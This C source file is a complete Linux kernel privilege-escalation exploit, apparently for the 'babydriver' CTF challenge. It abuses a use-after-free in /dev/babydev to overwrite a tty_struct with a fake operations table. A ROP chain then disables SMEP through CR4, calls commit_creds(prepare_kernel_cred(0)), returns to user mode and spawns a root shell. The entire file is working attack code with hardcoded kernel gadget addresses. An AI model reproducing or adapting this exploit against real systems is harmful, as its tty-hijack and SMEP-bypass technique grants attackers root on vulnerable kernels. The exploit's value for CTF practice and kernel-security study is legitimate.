#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/ioctl.h>

size_t vmlinux_base, offset, commit_creds = 0xffffffff810a1420, prepare_kernel_cred = 0xffffffff810a1810;
size_t user_cs, user_ss, user_sp, user_rflags;
size_t raw_vmlinux_base = 0xffffffff81000000;

void save_status()
{
	__asm__(
	"mov user_cs, cs;"
	"mov user_ss, ss;"
	"mov user_sp, rsp;"
	"pushf;"
	"pop user_rflags;"
	);
	puts("[+] save the state success!");
}

void get_shell()
{
	if (getuid() == 0)
	{
		puts("[+] get root");
		system("/bin/sh");
		puts("[*] get shell");
	}
	else
	{
		puts("[-] get shell error");
		sleep(5);
		exit(0);
	}
}

void get_root()
{
	//commit_creds(prepare_kernel_cred(0))
	void *(*pkc)(int) = (void *(*)(int))prepare_kernel_cred;
	void (*cc)(void *) = (void (*)(void *))commit_creds;
	(*cc)((*pkc)(0));
}

int main()
{
	signal(11, (size_t)get_shell);
	size_t rop[0x100] = {0};
	size_t user_buf[0x100] = {0};
	size_t fake_tty_struct[4] = {0};
	size_t fake_tty_operations[35] = {0};

	save_status();
	int fd1 = open("/dev/babydev", 2);
	int fd2 = open("/dev/babydev", 2);
	if(fd1 <0 || fd2 < 0)
	{
		puts("[-] open babydev error");
		sleep(5);
		exit(0);
	}

	ioctl(fd1, 0x10001, 0x2e0);
	close(fd1);

	int fd_tty = open("/dev/ptmx", O_RDWR|O_NOCTTY);
	if(fd_tty < 0)
	{
		puts("[-] open ptmx error");
		sleep(5);
		exit(0);
	}

	int i = 0;
	rop[i++] = 0xffffffff810d238d; // pop rdi; ret;
	rop[i++] = 0x6f0;
	rop[i++] = 0xffffffff81004d80; // mov cr4, rdi; pop rbp; ret;
	rop[i++] = 0;
	rop[i++] = (size_t)get_root;
	rop[i++] = 0xffffffff81063694; // swapgs; pop rbp; ret;
	rop[i++] = 0;
	rop[i++] = 0xffffffff814e35ef; // iretq; ret;
	rop[i++] = (size_t)get_shell;
	rop[i++] = user_cs;
	rop[i++] = user_rflags;
	rop[i++] = user_sp;
	rop[i++] = user_ss;

	fake_tty_operations[7] = 0xffffffff8181bfc5; // mov rsp, rax;

	fake_tty_operations[0] = 0xffffffff8100ce6e; // pop rax; ret;
	fake_tty_operations[1] = (size_t)rop;
	fake_tty_operations[2] = 0xffffffff8181bfc5; // mov rsp, rax;

	read(fd2, fake_tty_struct, 32);
	fake_tty_struct[3] = (size_t)fake_tty_operations;

	write(fd2, fake_tty_struct, 32);

	write(fd_tty,"FXC",3);
	return 0;
}
